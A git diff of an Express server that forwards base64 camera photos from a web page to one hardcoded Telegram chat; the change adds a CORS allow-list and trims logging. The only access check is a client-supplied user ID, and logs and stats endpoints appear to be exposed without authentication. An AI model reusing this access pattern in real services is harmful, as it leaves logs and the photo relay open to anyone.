@@ -79,6 +79,27 @@ function appendToLogFile(logEntry) {
     }
 }
 
+// ⭐ ВАЖНО: Настраиваем CORS для разрешения запросов с GitHub Pages
+const corsOptions = {
+    origin: [
+        'https://your-username.github.io', // Замените на ваш GitHub Pages URL
+        'http://localhost:3000',
+        'http://localhost:8000',
+        'http://127.0.0.1:3000',
+        'http://127.0.0.1:8000',
+        'https://telegram-camera-bot-production.up.railway.app'
+    ],
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
+    credentials: true,
+    optionsSuccessStatus: 200
+};
+
+// Middleware
+app.use(cors(corsOptions)); // ⭐ Используем настройки CORS
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static('public'));
+
 // Middleware для логирования запросов
 app.use((req, res, next) => {
     const start = Date.now();
@@ -86,10 +107,9 @@ app.use((req, res, next) => {
     logger.info('Incoming HTTP Request', {
         method: req.method,
         url: req.url,
+        origin: req.get('origin'),
         ip: req.ip || req.connection.remoteAddress,
-        userAgent: req.get('User-Agent'),
-        contentType: req.get('Content-Type'),
-        contentLength: req.get('Content-Length')
+        userAgent: req.get('User-Agent')
     });
 
     const originalSend = res.send;
@@ -101,7 +121,7 @@ app.use((req, res, next) => {
             url: req.url,
             statusCode: res.statusCode,
             duration: `${duration}ms`,
-            contentLength: res.get('Content-Length')
+            origin: req.get('origin')
         });
         
         originalSend.call(this, data);
@@ -110,19 +130,27 @@ app.use((req, res, next) => {
     next();
 });
 
-// Middleware
-app.use(cors());
-app.use(express.json({ limit: '50mb' })); // Увеличиваем лимит для больших фото
-app.use(express.static('public'));
+// Health check endpoint
+app.get('/', (req, res) => {
+    logger.info('Health check requested', { origin: req.get('origin') });
+    res.json({ 
+        status: 'OK', 
+        user: 'Alexander Gorchakov',
+        user_id: 1189539923,
+        token: process.env.BOT_TOKEN ? 'SET' : 'MISSING',
+        timestamp: new Date().toISOString(),
+        environment: process.env.NODE_ENV || 'development',
+        cors: 'ENABLED',
+        allowed_origins: corsOptions.origin
+    });
+});
 
 // Функция для очистки base64 данных
 function cleanBase64Data(base64String) {
     if (!base64String) return null;
     
-    // Удаляем префикс data URL если присутствует
     const cleaned = base64String.replace(/^data:image\/[a-z]+;base64,/, '');
     
-    // Проверяем padding
     const padding = cleaned.length % 4;
     if (padding !== 0) {
         return cleaned + '='.repeat(4 - padding);
@@ -131,17 +159,13 @@ function cleanBase64Data(base64String) {
     return cleaned;
 }
 
-// Функция для проверки валидности base64
 function isValidBase64(str) {
     try {
-        // Пытаемся декодировать
         const cleaned = cleanBase64Data(str);
         if (!cleaned) return false;
         
-        // Проверяем длину
         if (cleaned.length % 4 !== 0) return false;
         
-        // Пробуем декодировать
         Buffer.from(cleaned, 'base64');
         return true;
     } catch (error) {
@@ -149,21 +173,7 @@ function isValidBase64(str) {
     }
 }
 
-// Health check endpoint
-app.get('/', (req, res) => {
-    logger.info('Health check requested');
-    res.json({ 
-        status: 'OK', 
-        user: 'Alexander Gorchakov',
-        user_id: 1189539923,
-        token: process.env.BOT_TOKEN ? 'SET' : 'MISSING',
-        timestamp: new Date().toISOString(),
-        environment: process.env.NODE_ENV || 'development',
-        logs: `https://${req.get('host')}/api/logs`
-    });
-});
-
-// API endpoint for sending photos to Telegram - ИСПРАВЛЕННАЯ ВЕРСИЯ
+// API endpoint for sending photos to Telegram
 app.post('/api/send-photo', async (req, res) => {
     const requestId = Math.random().toString(36).substr(2, 9);
     const startTime = Date.now();
@@ -174,20 +184,13 @@ app.post('/api/send-photo', async (req, res) => {
         logger.info('Photo send request received', {
             requestId,
             user_id,
+            origin: req.get('origin'),
             hasPhotoData: !!photo_data,
-            photoDataSize: photo_data ? Math.round(photo_data.length / 1024) + ' KB' : 'N/A',
-            captionLength: caption ? caption.length : 0,
-            clientIp: req.ip
+            photoDataSize: photo_data ? Math.round(photo_data.length / 1024) + ' KB' : 'N/A'
         });
 
         // Validation
         if (!user_id || !photo_data) {
-            logger.warn('Validation failed - missing data', {
-                requestId,
-                missing_user_id: !user_id,
-                missing_photo_data: !photo_data
-            });
-            
             return res.status(400).json({ 
                 success: false, 
                 error: 'Missing user_id or photo_data',
@@ -195,15 +198,7 @@ app.post('/api/send-photo', async (req, res) => {
             });
         }
 
-        // Ensure it's only for your user ID
         if (parseInt(user_id) !== 1189539923) {
-            logger.warn('Unauthorized access attempt', {
-                requestId,
-                provided_user_id: user_id,
-                expected_user_id: 1189539923,
-                clientIp: req.ip
-            });
-            
             return res.status(403).json({ 
                 success: false, 
                 error: 'Access denied. Wrong user ID.',
@@ -212,7 +207,6 @@ app.post('/api/send-photo', async (req, res) => {
         }
 
         if (!process.env.BOT_TOKEN) {
-            logger.error('BOT_TOKEN not configured', { requestId });
             return res.status(500).json({
                 success: false,
                 error: 'BOT_TOKEN not configured on server',
@@ -220,14 +214,7 @@ app.post('/api/send-photo', async (req, res) => {
             });
         }
 
-        // Проверяем и чистим base64 данные
         if (!isValidBase64(photo_data)) {
-            logger.error('Invalid base64 photo data', {
-                requestId,
-                dataStart: photo_data.substring(0, 50) + '...',
-                dataLength: photo_data.length
-            });
-            
             return res.status(400).json({
                 success: false,
                 error: 'Invalid base64 photo data format',
@@ -237,21 +224,11 @@ app.post('/api/send-photo', async (req, res) => {
 
         const cleanedPhotoData = cleanBase64Data(photo_data);
         
-        logger.debug('Cleaned photo data for sending', {
-            requestId,
-            originalLength: photo_data.length,
-            cleanedLength: cleanedPhotoData.length,
-            isBase64Valid: isValidBase64(photo_data)
-        });
-
-        // Создаем FormData для отправки файла
         const FormData = require('form-data');
         const form = new FormData();
         
-        // Добавляем поля в форму
         form.append('chat_id', user_id);
         
-        // Создаем buffer из base64 и добавляем как файл
         const imageBuffer = Buffer.from(cleanedPhotoData, 'base64');
         form.append('photo', imageBuffer, {
             filename: `photo-${Date.now()}.jpg`,
@@ -263,13 +240,7 @@ app.post('/api/send-photo', async (req, res) => {
         }
         form.append('parse_mode', 'HTML');
 
-        logger.debug('Sending photo to Telegram API using FormData', {
-            requestId,
-            imageBufferSize: imageBuffer.length + ' bytes',
-            hasCaption: !!caption
-        });
-
-        // Send photo to Telegram используя FormData
+        // Send photo to Telegram
         const telegramStart = Date.now();
         const response = await axios.post(
             `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`,
@@ -287,10 +258,8 @@ app.post('/api/send-photo', async (req, res) => {
         logger.info('Photo sent successfully to Telegram', {
             requestId,
             messageId: response.data.result.message_id,
-            chatId: response.data.result.chat.id,
             telegramDuration: `${telegramDuration}ms`,
-            totalDuration: `${Date.now() - startTime}ms`,
-            method: 'FormData'
+            totalDuration: `${Date.now() - startTime}ms`
         });
         
         res.json({ 
@@ -307,9 +276,7 @@ app.post('/api/send-photo', async (req, res) => {
         logger.error('Failed to send photo to Telegram', error, {
             requestId,
             duration: `${duration}ms`,
-            user_id: req.body.user_id,
-            photoDataSize: req.body.photo_data ? Math.round(req.body.photo_data.length / 1024) + ' KB' : 'N/A',
-            errorDetails: error.response?.data
+            origin: req.get('origin')
         });
         
         let errorMessage = 'Unknown error occurred';
@@ -326,7 +293,6 @@ app.post('/api/send-photo', async (req, res) => {
             success: false, 
             error: errorMessage,
             telegramError: telegramError,
-            details: 'Check if BOT_TOKEN is valid and bot is started with /start',
             requestId,
             duration
         });
@@ -338,10 +304,9 @@ app.get('/api/bot-status', async (req, res) => {
     const startTime = Date.now();
     
     try {
-        logger.debug('Bot status check requested');
+        logger.debug('Bot status check requested', { origin: req.get('origin') });
         
         if (!process.env.BOT_TOKEN) {
-            logger.warn('Bot status check - BOT_TOKEN missing');
             return res.json({ 
                 status: 'MISSING_TOKEN', 
                 message: 'BOT_TOKEN not set' 
@@ -355,7 +320,6 @@ app.get('/api/bot-status', async (req, res) => {
 
         logger.info('Bot status check successful', {
             botName: response.data.result.first_name,
-            botUsername: response.data.result.username,
             duration: `${Date.now() - startTime}ms`
         });
 
@@ -376,29 +340,6 @@ app.get('/api/bot-status', async (req, res) => {
             duration: Date.now() - startTime
         });
     }
-});
-
-// Новый endpoint для тестирования base64
-app.post('/api/test-base64', (req, res) => {
-    const { photo_data } = req.body;
-    
-    if (!photo_data) {
-        return res.json({
-            valid: false,
-            error: 'No photo_data provided'
-        });
-    }
-    
-    const isValid = isValidBase64(photo_data);
-    const cleaned = cleanBase64Data(photo_data);
-    
-    res.json({
-        valid: isValid,
-        originalLength: photo_data.length,
-        cleanedLength: cleaned ? cleaned.length : 0,
-        hasDataPrefix: photo_data.startsWith('data:'),
-        sample: photo_data.substring(0, 100) + '...'
-    });
 });
 
 // API для просмотра логов
@@ -455,10 +396,17 @@ app.get('/api/stats', (req, res) => {
                 nodeEnv: process.env.NODE_ENV || 'development',
                 port: PORT,
                 botTokenSet: !!process.env.BOT_TOKEN
+            },
+            cors: {
+                enabled: true,
+                origin: req.get('origin') || 'unknown'
             }
         };
 
-        logger.info('Statistics requested', { clientIp: req.ip });
+        logger.info('Statistics requested', { 
+            clientIp: req.ip,
+            origin: req.get('origin')
+        });
         
         res.json(stats);
     } catch (error) {
@@ -469,26 +417,34 @@ app.get('/api/stats', (req, res) => {
 
 // Test endpoint to verify server is working
 app.get('/api/test', (req, res) => {
-    logger.debug('Test endpoint called', { clientIp: req.ip });
+    logger.debug('Test endpoint called', { 
+        clientIp: req.ip,
+        origin: req.get('origin')
+    });
     
     res.json({
         message: 'Server is working!',
         user_id: 1189539923,
         timestamp: new Date().toISOString(),
         environment: process.env.NODE_ENV || 'development',
+        cors: 'enabled',
+        origin: req.get('origin') || 'unknown',
         requestId: Math.random().toString(36).substr(2, 9)
     });
 });
 
+// Endpoint для проверки CORS
+app.options('*', cors(corsOptions)); // ⭐ Обработка preflight запросов
+
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
-    logger.info('Server starting with FIXED photo upload', {
+    logger.info('Server starting with CORS enabled', {
         port: PORT,
         user: 'Alexander Gorchakov',
         user_id: 1189539923,
         environment: process.env.NODE_ENV || 'development',
         botToken: process.env.BOT_TOKEN ? 'SET' : 'MISSING',
-        fix: 'FormData with base64 cleaning'
+        cors: 'ENABLED'
     });
     
     console.log('🚀 === Telegram Camera Bot Server ===');
@@ -496,13 +452,12 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('👤 User: Alexander Gorchakov');
     console.log('🆔 User ID: 1189539923');
     console.log('🔑 BOT_TOKEN:', process.env.BOT_TOKEN ? '✅ SET' : '❌ MISSING');
-    console.log('🔧 FIX: FormData upload with base64 cleaning');
+    console.log('🌐 CORS: ✅ ENABLED');
+    console.log('📡 Allowed Origins:', corsOptions.origin.join(', '));
     console.log('🌐 Environment:', process.env.NODE_ENV || 'development');
-    console.log('📊 Logs Directory:', logsDir);
     console.log('📧 Access URLs:');
-    console.log('   Main: http://localhost:' + PORT + '/');
-    console.log('   Camera: http://localhost:' + PORT + '/camera-app.html');
-    console.log('   Logs: http://localhost:' + PORT + '/api/logs');
-    console.log('   Stats: http://localhost:' + PORT + '/api/stats');
+    console.log('   Main: https://telegram-camera-bot-production.up.railway.app/');
+    console.log('   Logs: https://telegram-camera-bot-production.up.railway.app/api/logs');
+    console.log('   Stats: https://telegram-camera-bot-production.up.railway.app/api/stats');
     console.log('====================================');
 });
